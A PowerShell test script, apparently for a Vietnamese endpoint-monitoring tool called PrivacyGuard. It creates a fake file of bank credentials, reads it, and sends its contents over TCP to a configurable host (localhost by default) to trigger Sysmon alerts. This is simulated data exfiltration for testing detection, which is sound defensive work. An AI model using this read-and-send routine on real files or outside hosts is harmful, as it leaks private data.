param(
    [string]$TargetHost = "127.0.0.1",
    [int]$TargetPort = 8501
)

Write-Host "============================================================" -ForegroundColor Cyan
Write-Host "   PRIVACYGUARD - TEST GIA LAP HANH VI DANH CAP DU LIEU     " -ForegroundColor Cyan
Write-Host "============================================================" -ForegroundColor Cyan

# 1. Thu muc tai lieu nhay cam
$docsDir = "data\FakeDocuments"
if (-not (Test-Path $docsDir)) {
    New-Item -ItemType Directory -Path $docsDir -Force | Out-Null
}

$sampleFile = Join-Path $docsDir "sao_ke_tai_khoan_vip.xlsx"
Write-Host "[1/3] Dang mo/doc tep nhay cam: $sampleFile..." -ForegroundColor Yellow

$secretContent = "MAT - SO TAI KHOAN NGAN HANG: 0123456789 - MAT KHAU: SuperSecretPass123! " * 20
Set-Content -Path $sampleFile -Value $secretContent -Encoding UTF8

# Doc tep (Kich hoat Sysmon Event 11)
$data = Get-Content -Path $sampleFile -Raw
Write-Host "      -> Da doc $($data.Length) ky tu tu tep bi mat." -ForegroundColor Green

# 2. Ket noi mang ra ngoai (Kich hoat Sysmon Event 3)
Write-Host "[2/3] Dang len gui du lieu ra may chu ngoai mang: ${TargetHost}:${TargetPort}..." -ForegroundColor Yellow
try {
    $tcp = New-Object System.Net.Sockets.TcpClient
    $tcp.Connect($TargetHost, $TargetPort)
    $stream = $tcp.GetStream()
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($data)
    $stream.Write($bytes, 0, $bytes.Length)
    $stream.Flush()
    $tcp.Close()
    Write-Host "      -> Da truyen thanh cong $($bytes.Length) bytes toi may chu!" -ForegroundColor Green
} catch {
    Write-Host "      -> Da phat sinh ket noi mang TCP toi ${TargetHost}:${TargetPort} (Sysmon da ghi nhan Event 3)." -ForegroundColor Green
}

Write-Host "[3/3] Hoan tat dot gia lap tan cong!" -ForegroundColor Cyan
Write-Host "------------------------------------------------------------" -ForegroundColor DarkGray
Write-Host "KET QUA MONG DOI TREN PRIVACYGUARD:" -ForegroundColor White
Write-Host "1. Thong bao Windows Toast se hien len o goc phai man hinh trong vai giay." -ForegroundColor Yellow
Write-Host "2. Tren Tray Icon goc phai: So luong canh bao se tang len." -ForegroundColor Yellow
Write-Host "3. Tren Web Dashboard: Mo Tab 2 'Nhat ky & Xu ly nguy co' de xem chi tiet bat qua tang!" -ForegroundColor Yellow
Write-Host "============================================================" -ForegroundColor Cyan
